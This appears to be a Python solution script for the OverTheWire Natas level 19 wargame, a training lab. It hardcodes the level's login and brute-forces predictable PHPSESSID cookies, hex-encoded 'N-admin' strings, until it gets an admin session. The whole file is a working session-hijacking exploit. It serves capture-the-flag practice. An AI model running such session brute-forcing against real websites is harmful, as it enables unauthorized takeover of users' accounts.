import requests

url="http://natas19.natas.labs.overthewire.org/"
auth=("natas19","tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")

for i in range(1,641):
    a=str(i)+"-admin"
    response=requests.post(url,data={"username":"admin","password":"admin"},auth=auth,cookies={"PHPSESSID":str(a.encode().hex())})
    if "You are an admin." in response.text:
        print(response.text)
        break